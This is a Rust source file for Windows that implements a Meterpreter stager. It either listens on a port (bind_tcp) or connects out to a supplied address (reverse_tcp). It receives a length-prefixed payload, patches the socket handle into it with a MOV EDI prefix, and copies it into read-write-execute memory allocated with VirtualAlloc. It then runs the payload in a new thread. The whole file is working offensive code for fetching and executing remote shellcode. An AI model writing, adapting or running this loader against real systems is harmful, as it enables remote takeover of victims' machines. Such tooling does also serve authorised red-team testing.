use std::error::Error;
use std::io::BufReader;
use std::io::Read;
use std::net::{TcpListener, TcpStream};
use std::os::windows::io::AsRawSocket;
use std::{mem, ptr};

#[allow(clippy::wildcard_imports)]
use windows::Win32::System::{Memory::*, Threading::*};

/// Implement the main logic of the program
pub fn run(addr: &str) -> Result<(), Box<dyn Error>> {
    let stream = if addr.starts_with(':') {
        // Start a bind_tcp stager
        let addr = format!("0.0.0.0{addr}");
        println!("[*] Using bind_tcp stager ({addr})");
        let listener = TcpListener::bind(&addr)?;
        let (stream, _) = listener.accept()?;
        stream
    } else {
        // Start a reverse_tcp stager
        println!("[*] Using reverse_tcp stager ({addr})");
        TcpStream::connect(addr)?
    };

    // Receive and execute the payload
    let payload = payload_recv(&stream)?;
    println!("[+] Payload received!");
    payload_exec(&payload);

    Ok(())
}

/// Receive a Meterpreter payload via TCP
fn payload_recv(stream: &TcpStream) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut reader = BufReader::new(stream);

    // Read the 4-byte payload length and allocate the payload buffer
    let mut tmp = [0u8; 4];
    reader.read_exact(&mut tmp)?;
    let length = u32::from_le_bytes(tmp);
    let mut payload = vec![0u8; length as usize + 5];

    // Prepend some ASM to MOV the socket handle into EDI
    // MOV EDI, 0x12345678 ; BF 78 56 34 12
    #[allow(clippy::cast_possible_truncation)]
    let fd = stream.as_raw_socket() as u32;
    payload[0] = 0xbf;
    payload[1..5].copy_from_slice(&fd.to_le_bytes());

    // Finish reading the payload
    reader.read_exact(&mut payload[5..])?;
    Ok(payload)
}

/// Execute a Windows payload
fn payload_exec(payload: &[u8]) {
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const INFINITE: u32 = 0xFFFF_FFFF;

    // Get a pointer to RWX memory
    let ptr = unsafe {
        VirtualAlloc(
            None,
            payload.len(),
            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE),
            PAGE_EXECUTE_READWRITE,
        )
    };
    if ptr.is_null() {
        eprintln!("[!] Error: Failed to allocate memory for payload");
        return;
    }

    // Copy and execute the payload
    unsafe {
        ptr::copy_nonoverlapping(payload.as_ptr(), ptr.cast::<u8>(), payload.len());
        #[allow(clippy::missing_transmute_annotations)]
        let _ = CreateThread(
            None,
            0,
            Some(mem::transmute(ptr)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        );
        // Wait for the thread to finish running
        let _ = WaitForSingleObject(GetCurrentThread(), INFINITE);
    }
}
